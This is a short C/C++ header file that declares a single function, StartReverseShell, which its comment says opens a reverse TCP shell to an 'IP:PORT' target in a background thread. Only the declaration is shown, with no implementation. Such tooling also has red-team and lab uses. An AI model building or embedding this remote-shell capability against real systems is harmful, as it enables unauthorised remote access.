// include/shell.h
#pragma once

#ifdef __cplusplus
extern "C" {
#endif

// Start a reverse TCP shell to target "IP:PORT" in a separate thread
void StartReverseShell(const char* target);

#ifdef __cplusplus
}
#endif